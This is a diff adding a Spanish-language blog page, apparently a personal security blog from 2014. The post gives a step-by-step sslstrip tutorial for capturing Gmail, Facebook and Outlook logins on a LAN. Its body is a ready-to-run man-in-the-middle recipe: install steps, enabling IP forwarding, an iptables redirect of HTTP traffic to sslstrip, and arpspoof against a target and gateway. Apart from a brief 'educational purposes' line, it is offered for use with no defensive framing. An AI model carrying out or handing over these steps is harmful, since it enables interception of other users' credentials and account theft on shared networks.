@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="Este es un video con fines educativos. SSLstrip nos permite sniffar usuarios y contraseñas encriptadas en HTTPS. Esto lo hace realizando un ataque MITM entre el servidor y nuestro objetivo conectandose al servidor mediante HTTP (sin encriptar) en lugar de HTTPS (encriptado) con lo que los datos son visibles. Algunos ejemplos de páginas que utilizan esta encriptacion son Gmail o tuenti">
+    <meta name="author" content="Jonathan Posada">
+    <link rel="shortcut icon" href="../../assets/ico/favicon.ico">
+
+    <title>Obtener Credenciales de hotmail, gmail, facebook, tuenti .... en una red lan con sslstrip y linux.</title>
+
+    <!-- Bootstrap core CSS -->
+    <link href="assets/dist/css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Custom styles for this template -->
+    <link href="css/blog.css" rel="stylesheet">
+
+    <!-- Just for debugging purposes. Don't actually copy this line! -->
+    <!--[if lt IE 9]><script src="../../assets/js/ie8-responsive-file-warning.js"></script><![endif]-->
+
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+      <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+  </head>
+
+  <body>
+
+    <div class="blog-masthead">
+      <div class="container">
+        <nav class="blog-nav">
+          <a class="blog-nav-item" href="#">Inicio</a>
+          <a class="blog-nav-item active" href="#">Blog</a>
+          <a class="blog-nav-item" href="#">Proyectos</a>
+          <a class="blog-nav-item" href="#">Contacto</a>
+        </nav>
+      </div>
+    </div>
+
+    <div class="container">
+
+      <div class="blog-header">
+        <h1 class="blog-title">Un Informatico con Linux</h1>
+        <p class="lead blog-description">Blog Itodosoft-Sec</p>
+      </div>
+
+      <div class="row">
+
+        <div class="col-sm-8 blog-main">
+
+          <div class="blog-post">
+            <div class="well">
+              <h2 class="blog-post-title">Obtener credenciales-contraseñas de facebook, outlook, gmail en una red Lan con SSLstrip y linux.</h2>
+            </div>
+            <p class="blog-post-meta">Viernes 14 de Febrero @po51</p>
+            <p><iframe class="youtube-player" type="text/html" width="640" height="385" src="http://www.youtube.com/embed/3pUIawnyz_I" frameborder="0"></iframe></p>
+            <br />
+            <p>
+              <h3>Introduccion</h3><hr>
+              Este es un video con fines educativos.
+              SSLstrip nos permite sniffar usuarios y contraseñas encriptadas en HTTPS. Esto lo hace realizando un ataque MITM entre el servidor y nuestro objetivo conectandose al servidor mediante HTTP (sin encriptar) en lugar de HTTPS (encriptado) con lo que los datos son visibles. Algunos ejemplos de páginas que utilizan esta encriptacion son Gmail o tuenti
+            </p>
+            <br />
+            <p>
+            <h3>Requerimientos</h3><hr>
+              <ul>
+                <li>Python >= 2.5 (apt-get install python)</li>
+                <li>The python "twisted-web" module (apt-get install python-twisted-web)</li>
+              </ul>
+              <br />            
+              <h3>Instalacion</h3><hr>
+              <pre><code>root@posi:/home/posi#tar zxvf sslstrip-0.9.tar.gz</code></pre>
+              <pre><code>root@posi:/home/posi#cd sslstrip-0.9</code></pre>
+              *Opcional
+              <pre><code>root@posi:/home/posi/sslstrip-0.9#sudo python ./setup.py install</code></pre>
+              <h3>Correr sslstrip </h3><hr>             
+              Forwarding mode.
+              <pre><code>root@posi:/home/posi/sslstrip-0.9#echo "1" > /proc/sys/net/ipv4/ip_forward</code></pre>
+              Configurar iptables to redirect HTTP traffic to sslstrip.
+              <pre><code>root@posi:/home/posi/sslstrip-0.9#iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 'listenPort'</code></pre>
+              Run sslstrip.
+              <pre><code>sslstrip.py -l 'listenPort'</code></pre>
+              Run arpspoof to convince a network they should send their traffic to you.
+              <pre><code>arpspoof -i 'interface' -t 'targetIP' 'gatewayIP'</code></pre>
+              That should do it.
+            </p>
+            <hr>
+            
+          </div><!-- /.blog-post -->
+
+          <ul class="pager">
+            <li><a href="index.html">Previous</a></li>
+            <li><a href="index.html">Next</a></li>
+          </ul>
+
+        </div><!-- /.blog-main -->
+
+        <div class="col-sm-3 col-sm-offset-1 blog-sidebar">
+          <div class="sidebar-module sidebar-module-inset">
+            <h4>Jonathan Posada</h4>
+            <img src="img/posi.jpg" alt="Cofundador Itodosoft" class="img-circle">
+            <p><br>Tecnologo Analista desarrollador de software. <br>Intereses seguridad informatica, linux, software libre. </p>
+          </div>
+          <div class="sidebar-module">
+            <h4>Archives</h4>
+            <ol class="list-unstyled">
+              <li><a href="#">January 2014</a></li>
+              <li><a href="#">December 2013</a></li>
+              <li><a href="#">November 2013</a></li>
+              <li><a href="#">October 2013</a></li>
+              <li><a href="#">September 2013</a></li>
+              <li><a href="#">August 2013</a></li>
+              <li><a href="#">July 2013</a></li>
+              <li><a href="#">June 2013</a></li>
+              <li><a href="#">May 2013</a></li>
+              <li><a href="#">April 2013</a></li>
+              <li><a href="#">March 2013</a></li>
+              <li><a href="#">February 2013</a></li>
+            </ol>
+          </div>
+          <div class="sidebar-module">
+            <h4>Sigueme en las redes sociales</h4>
+            <ol class="list-unstyled">
+              <li><a href="#">GitHub</a></li>
+              <li><a href="http://www.youtube.com/channel/UCLruzL7n2W0ZhVL7BlGulGQ/videos">Youtube</a></li>
+              <li><a href="https://www.facebook.com/js.po51">Facebook</a></li>
+            </ol>
+          </div>
+        </div><!-- /.blog-sidebar -->
+
+      </div><!-- /.row -->
+
+    </div><!-- /.container -->
+
+    <div class="blog-footer">
+      <p>Blog ITodoSoft</a>.</p>
+      <p>
+        <a href="#">2014</a>
+      </p>
+    </div>
+
+
+    <!-- Bootstrap core JavaScript
+    ================================================== -->
+    <!-- Placed at the end of the document so the pages load faster -->
+    <script src="https://code.jquery.com/jquery-1.10.2.min.js"></script>
+    <script src="../../dist/js/bootstrap.min.js"></script>
+    <script src="../../assets/js/docs.min.js"></script>
+  </body>
+</html>
